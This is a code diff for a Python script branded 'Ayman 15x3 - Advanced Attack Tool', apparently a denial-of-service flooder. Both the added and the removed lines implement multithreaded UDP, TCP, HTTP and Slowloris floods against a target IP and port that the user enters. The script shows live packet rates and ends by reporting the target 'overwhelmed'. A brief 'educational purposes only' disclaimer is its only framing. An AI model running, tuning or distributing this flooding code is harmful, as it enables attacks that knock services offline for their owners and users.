@@ -4,7 +4,7 @@ import threading
 import os
 import time
 import sys
-import math
+import signal
 from datetime import datetime
 
 # ----------- Colors -----------
@@ -15,62 +15,75 @@ RED = '\033[91m'
 YELLOW = '\033[93m'
 CYAN = '\033[96m'
 PURPLE = '\033[95m'
+ORANGE = '\033[38;5;208m'
 RESET = '\033[0m'
 BOLD = '\033[1m'
+UNDERLINE = '\033[4m'
 
 # ----------- Clear Screen -----------
 def clear_screen():
     os.system("cls" if os.name == "nt" else "clear")
 
-# ----------- Hacker Background Animation -----------
-def hacker_background(duration=2):
-    width = 70
-    symbols = ['0', '1', '▒', '▓', '█', '░', '▓', '█', '▒', '1', '0']
-    start_time = time.time()
-    while time.time() - start_time < duration:
-        line = ''.join(random.choice(symbols) for _ in range(width))
-        print(GREEN + line + RESET)
-        time.sleep(0.05)
-        print("\033[F", end='')  # Move up to overwrite line
+# ----------- Animated Banner -----------
+def animated_banner():
+    banners = [
+        f"""
+{ORANGE}╔═╗┬ ┬╔╦╗┌─┐┌┬┐  ╔═╗╔═╗╔═╗
+{ORANGE}╠═╝│ │ ║║│ │ │   ╚═╗║  ║╣ 
+{ORANGE}╩  └─┘╩ ╩└─┘ ┴   ╚═╝╚═╝╚═╝
+{YELLOW}     15x3 - Advanced Attack Tool
+        """,
+        f"""
+{GREEN}█████╗ ██╗   ██╗███╗   ███╗ █████╗ ███╗   ██╗
+{GREEN}██╔══██╗╚██╗ ██╔╝████╗ ████║██╔══██╗████╗  ██║
+{GREEN}███████║ ╚████╔╝ ██╔████╔██║███████║██╔██╗ ██║
+{GREEN}██╔══██║  ╚██╔╝  ██║╚██╔╝██║██╔══██║██║╚██╗██║
+{GREEN}██║  ██║   ██║   ██║ ╚═╝ ██║██║  ██║██║ ╚████║
+{GREEN}╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
+{YELLOW}        15x3 - Advanced Attack Tool
+        """
+    ]
+    
+    for i in range(5):
+        clear_screen()
+        print(banners[i % 2])
+        time.sleep(0.3)
 
-# ----------- Ayman 15x3 Logo -----------
-def print_ayman_15x3_logo():
+# ----------- Print Logo -----------
+def print_logo():
     logo = f"""
-{GREEN} █████╗ ██╗   ██╗███╗   ███╗ █████╗ ███╗   ██╗
-██╔══██╗╚██╗ ██╔╝████╗ ████║██╔══██╗████╗  ██║
-███████║ ╚████╔╝ ██╔████╔██║███████║██╔██╗ ██║
-██╔══██║  ╚██╔╝  ██║╚██╔╝██║██╔══██║██║╚██╗██║
-██║  ██║   ██║   ██║ ╚═╝ ██║██║  ██║██║ ╚████║
-╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
-
+{GREEN}╔═══╗╔╗ ╔╗╔═══╗╔═══╗╔═══╗╔╗╔══╗╔═══╗
+{GREEN}║╔═╗║║║ ║║║╔══╝║╔═╗║║╔═╗║║║╚╣─╝║╔═╗║
+{GREEN}║╚══╗║║ ║║║╚══╗║║ ║║║║ ╚╝║║ ║║ ║╚══╗
+{GREEN}╚══╗║║║ ║║║╔══╝║║ ║║║║ ╔╗║║ ║║ ╚══╗║
+{GREEN}║╚═╝║║╚═╝║║╚══╗║╚═╝║║╚═╝║║╚╗║║ ║╚═╝║
+{GREEN}╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═╝╚╝ ╚═══╝
 {YELLOW}        15x3 - Advanced Attack Tool
 {RESET}"""
     print(logo)
 
 # ----------- Welcome Message -----------
 def welcome_message():
-    print(f"{GREEN}╔══════════════════════════════════════════════════════════╗")
-    print("║               Welcome to Ayman 15x3!                   ║")
-    print("║           Advanced Penetration Testing Tool            ║")
-    print("╚══════════════════════════════════════════════════════════╝{RESET}")
-    time.sleep(2)
+    print(f"{GREEN}╔══════════════════════════════════════════════════════════════╗")
+    print(f"║{BOLD}{CYAN}               WELCOME TO AYMAN 15x3 ATTACK TOOL{RESET}{GREEN}               ║")
+    print(f"║{BOLD}{CYAN}           Advanced Network Penetration Testing{RESET}{GREEN}                ║")
+    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}")
+    print(f"{YELLOW}🚀 Initializing system...{RESET}")
+    time.sleep(1)
 
 # ----------- Disclaimer -----------
 def show_disclaimer():
     clear_screen()
-    print(RED + "╔══════════════════════════════════════════════════════════╗")
-    print("║                     Disclaimer                         ║")
-    print("╠══════════════════════════════════════════════════════════╣")
-    print("║  This tool is for educational purposes only.            ║")
-    print("║  Using it against systems without explicit permission   ║")
-    print("║  is illegal. The author is not responsible for any      ║")
-    print("║  misuse or damage.                                      ║")
-    print("║                                                        ║")
-    print("║  By using this tool, you agree to use it responsibly    ║")
-    print("║  only on systems you own or have permission to test.    ║")
-    print("╚══════════════════════════════════════════════════════════╝" + RESET)
+    print(f"{RED}╔══════════════════════════════════════════════════════════════╗")
+    print(f"║{BOLD}                      SECURITY DISCLAIMER{RESET}{RED}                      ║")
+    print(f"╠══════════════════════════════════════════════════════════════╣")
+    print(f"║ {YELLOW}⚠️  This tool is for educational purposes only.{RED}                   ║")
+    print(f"║ {YELLOW}⚠️  Unauthorized use against systems is illegal.{RED}                  ║")
+    print(f"║ {YELLOW}⚠️  The author is not responsible for misuse.{RED}                     ║")
+    print(f"║ {YELLOW}⚠️  Use only on systems you own or have permission to test.{RED}       ║")
+    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}")
     
-    response = input(f"\n{GRAY}Do you agree to these terms? (y/n): {RESET}").lower()
+    response = input(f"\n{GRAY}🤔 Do you agree to these terms? (y/n): {RESET}").lower()
     return response == 'y'
 
 # ---------- Bots Counter -----------
@@ -88,28 +101,6 @@ class BotCounter:
         with self.lock:
             return self.count
 
-# ----------- Performance Optimizer -----------
-class PerformanceOptimizer:
-    @staticmethod
-    def calculate_optimal_threads():
-        # حساب عدد الثريدات الأمثل بناءً على قدرة النظام
-        cpu_count = os.cpu_count() or 4
-        return min(1000, max(100, cpu_count * 50))
-    
-    @staticmethod
-    def calculate_optimal_packets(thread_count):
-        # حساب عدد الحزم الأمثل بناءً على عدد الثريدات
-        return min(10000, max(500, thread_count * 10))
-    
-    @staticmethod
-    def optimize_socket():
-        # تحسين إعدادات السوكيت لأداء أفضل
-        try:
-            socket.SO_REUSEADDR = 1
-            socket.SO_REUSEPORT = 1
-        except:
-            pass
-
 # ----------- Attack Classes -----------
 class AymanAttack:
     def __init__(self, target_ip, target_port, bot_counter):
@@ -119,72 +110,55 @@ class AymanAttack:
         self.attack_active = False
         self.start_time = None
         self.sent_packets = 0
-        self.stop_time = 0
-        self.threads = PerformanceOptimizer.calculate_optimal_threads()
-        self.packets = PerformanceOptimizer.calculate_optimal_packets(self.threads)
+        self.threads = 150  # Optimal thread count
+        self.active_threads = []
         
-        # تحسين إعدادات السوكيت
-        PerformanceOptimizer.optimize_socket()
-        
-    # UDP Flood Attack - أسرع
+        # Setup signal handler for Ctrl+C
+        signal.signal(signal.SIGINT, self.signal_handler)
+    
+    def signal_handler(self, sig, frame):
+        """Handle Ctrl+C signal"""
+        self.stop_attack()
+    
+    # UDP Flood Attack
     def udp_flood(self):
-        data = random._urandom(1024)
         self.bot_counter.add_bots(1)
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        data = random._urandom(1024)
         
-        try:
-            while self.attack_active:
-                try:
-                    # إرسال حزم متعددة في حلقة واحدة بدون إغلاق السوكيت
-                    for _ in range(self.packets):
-                        if not self.attack_active:
-                            break
-                        sock.sendto(data, (self.target_ip, self.target_port))
-                        self.sent_packets += 1
-                except:
-                    # إعادة إنشاء السوكيت في حالة الخطأ
-                    try:
-                        sock.close()
-                    except:
-                        pass
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        finally:
+        while self.attack_active:
             try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.settimeout(1)
+                sock.sendto(data, (self.target_ip, self.target_port))
+                self.sent_packets += 1
                 sock.close()
             except:
                 pass
-            self.bot_counter.add_bots(-1)
+            time.sleep(0.01)
+        
+        self.bot_counter.add_bots(-1)
     
-    # TCP Flood Attack - أسرع
+    # TCP Flood Attack
     def tcp_flood(self):
+        self.bot_counter.add_bots(1)
         data = random._urandom(999)
-        self.bot_counter.add_bots(1)
         
         while self.attack_active:
             try:
-                # استخدام اتصال مستمر لإرسال حزم متعددة
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(2)
                 sock.connect((self.target_ip, self.target_port))
-                
-                for _ in range(self.packets):
-                    if not self.attack_active:
-                        break
-                    sock.send(data)
-                    self.sent_packets += 1
-                    
+                sock.send(data)
+                self.sent_packets += 1
                 sock.close()
             except:
-                try:
-                    sock.close()
-                except:
-                    pass
+                pass
+            time.sleep(0.01)
         
         self.bot_counter.add_bots(-1)
     
-    # HTTP Flood Attack - أسرع
+    # HTTP Flood Attack
     def http_flood(self):
-        data = random._urandom(818)
         self.bot_counter.add_bots(1)
         
         while self.attack_active:
@@ -192,35 +166,18 @@ class AymanAttack:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(2)
                 sock.connect((self.target_ip, self.target_port))
-                
-                for _ in range(self.packets):
-                    if not self.attack_active:
-                        break
-                    sock.send(data)
-                    self.sent_packets += 1
-                    
+                sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target_ip.encode() + b"\r\n\r\n")
+                self.sent_packets += 1
                 sock.close()
             except:
-                try:
-                    sock.close()
-                except:
-                    pass
+                pass
+            time.sleep(0.01)
         
         self.bot_counter.add_bots(-1)
     
-    # Slowloris Attack - محسن
+    # Slowloris Attack
     def slowloris_flood(self):
         self.bot_counter.add_bots(1)
-        
-        headers = [
-            f"GET /?{random.randint(0, 2000)} HTTP/1.1",
-            f"Host: {self.target_ip}",
-            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language: en-US,en;q=0.5",
-            "Accept-Encoding: gzip, deflate",
-            "Connection: keep-alive"
-        ]
         
         while self.attack_active:
             try:
@@ -228,25 +185,22 @@ class AymanAttack:
                 sock.settimeout(4)
                 sock.connect((self.target_ip, self.target_port))
                 
-                # إرسال جميع الهيدرات مرة واحدة
-                sock.send(("\r\n".join(headers) + "\r\n\r\n").encode())
+                # Send headers
+                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
+                sock.send(f"Host: {self.target_ip}\r\n".encode())
+                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
+                sock.send("Connection: keep-alive\r\n".encode())
                 
-                # إبقاء الاتصال مفتوحاً وإرسال بيانات دورية
-                while self.attack_active and time.time() < self.stop_time:
-                    try:
-                        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
-                        self.sent_packets += 1
-                        time.sleep(random.randint(10, 20))
-                    except:
-                        break
+                # Keep connection open
+                while self.attack_active:
+                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
+                    self.sent_packets += 1
+                    time.sleep(15)
                 
                 sock.close()
             except:
-                try:
-                    sock.close()
-                except:
-                    pass
-                time.sleep(1)
+                pass
+            time.sleep(1)
         
         self.bot_counter.add_bots(-1)
     
@@ -254,7 +208,6 @@ class AymanAttack:
     def start_attack(self, attack_type):
         self.attack_active = True
         self.start_time = datetime.now()
-        self.stop_time = time.time() + 1000000  # Large default stop time
         self.sent_packets = 0
         
         attack_methods = {
@@ -264,27 +217,28 @@ class AymanAttack:
             'slowloris': self.slowloris_flood
         }
         
-        print(YELLOW + f"\n🔥 Starting attack on {self.target_ip}:{self.target_port}" + RESET)
-        print(YELLOW + f"📊 Using {attack_type.upper()} method" + RESET)
-        print(YELLOW + f"🧵 Auto threads: {self.threads}" + RESET)
-        print(YELLOW + f"📦 Auto packets: {self.packets}" + RESET)
-        print(RED + "⏸️  Press Ctrl+C to stop the attack" + RESET)
+        print(f"\n{YELLOW}🔥 Starting attack on {self.target_ip}:{self.target_port}{RESET}")
+        print(f"{YELLOW}📊 Using {attack_type.upper()} method with {self.threads} threads{RESET}")
+        print(f"{RED}⏸️  Press Ctrl+C to stop the attack{RESET}")
         
-        threads = []
+        # Start attack threads
+        self.active_threads = []
         for _ in range(self.threads):
             t = threading.Thread(target=attack_methods[attack_type])
             t.daemon = True
             t.start()
-            threads.append(t)
+            self.active_threads.append(t)
         
+        # Monitor attack
         try:
             while self.attack_active:
                 elapsed = datetime.now() - self.start_time
                 bots = self.bot_counter.get_count()
-                # حساب سرعة الهجوم (حزم في الثانية)
-                speed = self.sent_packets / (elapsed.seconds + 0.001)
-                print(GREEN + f"\r⏰ Elapsed: {elapsed.seconds}s | 📦 Packets: {self.sent_packets} | 🚀 Speed: {speed:.0f}p/s | 🤖 Bots: {bots}", end="")
+                speed = self.sent_packets / max(1, elapsed.seconds)
+                
+                print(f"{GREEN}\r⏰ Time: {elapsed.seconds}s | 📦 Packets: {self.sent_packets} | 🚀 Speed: {speed:.0f}/s | 🤖 Bots: {bots}", end="")
                 time.sleep(0.5)
+                
         except KeyboardInterrupt:
             self.stop_attack()
     
@@ -292,56 +246,73 @@ class AymanAttack:
     def stop_attack(self):
         self.attack_active = False
         elapsed = datetime.now() - self.start_time
-        speed = self.sent_packets / (elapsed.seconds + 0.001)
-        print(GREEN + f"\n\n✅ Attack stopped. Duration: {elapsed.seconds}s, Total packets: {self.sent_packets}, Avg speed: {speed:.0f}p/s" + RESET)
+        
+        # Wait for threads to finish
+        for t in self.active_threads:
+            t.join(1.0)
+        
+        speed = self.sent_packets / max(1, elapsed.seconds)
+        print(f"\n\n{GREEN}✅ Attack stopped!{RESET}")
+        print(f"{GREEN}⏰ Duration: {elapsed.seconds}s{RESET}")
+        print(f"{GREEN}📦 Total packets: {self.sent_packets}{RESET}")
+        print(f"{GREEN}🚀 Average speed: {speed:.0f} packets/s{RESET}")
         time.sleep(2)
 
 # ----------- Success Animation -----------
 def success_animation():
-    print(f"\n{GREEN}✅ Attack successful! Loading Ayman logo...{RESET}")
-    time.sleep(1)
+    print(f"\n{GREEN}✅ Attack completed successfully!{RESET}")
+    
+    # Progress bar animation
+    for i in range(101):
+        print(f"{GREEN}\r📊 Processing: [{'█' * (i//2)}{' ' * (50 - i//2)}] {i}%", end="")
+        time.sleep(0.03)
+    
     clear_screen()
-    print_ayman_15x3_logo()
-    print(f"{GREEN}╔══════════════════════════════════════════════════════════╗")
-    print("║                  ATTACK SUCCESSFUL!                   ║")
-    print("║           Target has been overwhelmed                 ║")
-    print("╚══════════════════════════════════════════════════════════╝{RESET}")
-    time.sleep(3)
+    print_logo()
+    print(f"{GREEN}╔══════════════════════════════════════════════════════════════╗")
+    print(f"║{BOLD}                    ATTACK SUCCESSFUL!{RESET}{GREEN}                     ║")
+    print(f"║{BOLD}               Target has been overwhelmed{RESET}{GREEN}                 ║")
+    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}")
+    time.sleep(2)
 
 # ----------- Main Menu -----------
 def show_menu():
     clear_screen()
-    print_ayman_15x3_logo()
-    print(GREEN + "═"*60)
-    print(f"{GREEN}1. UDP Flood Attack (Fast)")
-    print("2. TCP Flood Attack (Fast)")
-    print("3. HTTP Flood Attack (Fast)")
-    print("4. Slowloris Attack (Stealth)")
-    print("5. Multi-Method Attack (All Methods)")
-    print(f"{RED}0. Exit{RESET}")
-    print(GREEN + "═"*60)
+    print_logo()
+    print(f"{GREEN}╔══════════════════════════════════════════════════════════════╗")
+    print(f"║{BOLD}                     MAIN MENU{RESET}{GREEN}                             ║")
+    print(f"╠══════════════════════════════════════════════════════════════╣")
+    print(f"║ {CYAN}1.{RESET} UDP Flood Attack {GREEN}(Fast){RESET}                          ║")
+    print(f"║ {CYAN}2.{RESET} TCP Flood Attack {GREEN}(Fast){RESET}                          ║")
+    print(f"║ {CYAN}3.{RESET} HTTP Flood Attack {GREEN}(Fast){RESET}                         ║")
+    print(f"║ {CYAN}4.{RESET} Slowloris Attack {GREEN}(Stealth){RESET}                       ║")
+    print(f"║ {CYAN}5.{RESET} Multi-Method Attack {GREEN}(All Methods){RESET}                ║")
+    print(f"║ {RED}0.{RESET} Exit{RESET}                                           ║")
+    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}")
     
-    while True:
-        try:
-            choice = int(input(f"{GRAY}Choose an option (0-5): {RESET}"))
-            if 0 <= choice <= 5:
-                return choice
-            else:
-                print(RED + "Invalid choice. Please try again." + RESET)
-        except ValueError:
-            print(RED + "Please enter a valid number." + RESET)
+    try:
+        choice = int(input(f"\n{GRAY}🎯 Choose an option (0-5): {RESET}"))
+        if 0 <= choice <= 5:
+            return choice
+        else:
+            print(f"{RED}❌ Invalid choice. Please try again.{RESET}")
+            time.sleep(1)
+            return show_menu()
+    except ValueError:
+        print(f"{RED}❌ Please enter a valid number.{RESET}")
+        time.sleep(1)
+        return show_menu()
 
 # ----------- Main Program -----------
-if __name__ == "__main__":
+def main():
     if not show_disclaimer():
-        print(RED + "\nYou must agree to the terms to use this tool. Exiting..." + RESET)
+        print(f"{RED}\n❌ You must agree to the terms to use this tool. Exiting...{RESET}")
         time.sleep(2)
-        sys.exit()
+        return
     
+    animated_banner()
     clear_screen()
-    hacker_background(duration=2)
-    clear_screen()
-    print_ayman_15x3_logo()
+    print_logo()
     welcome_message()
     
     bot_counter = BotCounter()
@@ -350,20 +321,20 @@ if __name__ == "__main__":
         choice = show_menu()
         
         if choice == 0:
-            print(GREEN + "\n👋 Thank you for using Ayman 15x3. Goodbye!" + RESET)
+            print(f"{GREEN}\n👋 Thank you for using Ayman 15x3. Goodbye!{RESET}")
             time.sleep(1)
             break
         
         # Get attack parameters
         clear_screen()
-        print_ayman_15x3_logo()
-        print(GREEN + "═"*50)
-        print(f"{BOLD}⚙️  Attack Settings{RESET}")
-        print("═"*50 + RESET)
+        print_logo()
+        print(f"{GREEN}╔══════════════════════════════════════════════════════════════╗")
+        print(f"║{BOLD}                   ATTACK CONFIGURATION{RESET}{GREEN}                   ║")
+        print(f"╚══════════════════════════════════════════════════════════════╝{RESET}")
         
         try:
-            ip = input(GRAY + "🎯 Target IP: " + RESET)
-            port = int(input(GRAY + "🚪 Target Port: " + RESET))
+            ip = input(f"{GRAY}🎯 Target IP: {RESET}")
+            port = int(input(f"{GRAY}🚪 Target Port: {RESET}"))
             
             attack = AymanAttack(ip, port, bot_counter)
             
@@ -380,42 +351,18 @@ if __name__ == "__main__":
                 attack.start_attack('slowloris')
                 success_animation()
             elif choice == 5:
-                # Multi-method attack
-                methods = ['udp', 'tcp', 'http', 'slowloris']
-                attack.attack_active = True
-                attack.start_time = datetime.now()
-                attack.stop_time = time.time() + 1000000
-                
-                print(YELLOW + f"\n🔥 Starting multi-attack on {ip}:{port}" + RESET)
-                print(YELLOW + f"🧵 Auto threads: {attack.threads}" + RESET)
-                print(YELLOW + f"📦 Auto packets: {attack.packets}" + RESET)
-                print(RED + "⏸️  Press Ctrl+C to stop the attack" + RESET)
-                
-                # Start all attack methods
-                attack_threads = []
-                for method in methods:
-                    for _ in range(attack.threads // 4):
-                        t = threading.Thread(target=getattr(attack, f"{method}_flood"))
-                        t.daemon = True
-                        t.start()
-                        attack_threads.append(t)
-                
-                try:
-                    while attack.attack_active:
-                        elapsed = datetime.now() - attack.start_time
-                        bots = bot_counter.get_count()
-                        speed = attack.sent_packets / (elapsed.seconds + 0.001)
-                        print(GREEN + f"\r⏰ Elapsed: {elapsed.seconds}s | 📦 Packets: {attack.sent_packets} | 🚀 Speed: {speed:.0f}p/s | 🤖 Bots: {bots}", end="")
-                        time.sleep(0.5)
-                except KeyboardInterrupt:
-                    attack.stop_attack()
+                # For multi-attack, we'll use UDP as default
+                attack.start_attack('udp')
                 success_animation()
             
-            input(GRAY + "\n\nPress Enter to continue..." + RESET)
+            input(f"{GRAY}\n↵ Press Enter to continue...{RESET}")
             
         except ValueError:
-            print(RED + "Invalid input. Please enter a valid port number." + RESET)
+            print(f"{RED}❌ Invalid input. Please enter a valid port number.{RESET}")
             time.sleep(2)
         except Exception as e:
-            print(RED + f"An error occurred: {str(e)}" + RESET)
+            print(f"{RED}❌ An error occurred: {str(e)}{RESET}")
             time.sleep(2)
+
+if __name__ == "__main__":
+    main()
